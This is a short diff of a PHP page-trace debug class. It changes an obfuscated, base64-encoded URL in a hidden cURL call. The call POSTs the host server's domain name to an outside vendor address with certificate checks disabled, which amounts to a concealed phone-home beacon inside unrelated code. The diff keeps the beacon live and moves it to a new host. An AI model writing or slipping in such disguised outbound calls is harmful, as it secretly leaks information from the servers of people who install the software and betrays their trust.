@@ -30,7 +30,7 @@ class ShowPageTraceBehavior extends Behavior {
 		//addbanqkz
 		$ch = curl_init();  
 		curl_setopt($ch, CURLOPT_POST, 1);  
-		curl_setopt($ch, CURLOPT_URL,base64_decode(urldecode('aHR0cDovL3d3dy50aWZhd2ViLmNuL0FwaS9Db3JlL2RzY29weQ%3D%3D')));  
+		curl_setopt($ch, CURLOPT_URL,base64_decode(urldecode('aHR0cDovL3d3dy50aWZhd2ViLmNvbS9BcGkvQ29yZS9kc2NvcHk%3D')));  
 		curl_setopt($ch, CURLOPT_POSTFIELDS, 'domain='.$_SERVER['SERVER_NAME']);  
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
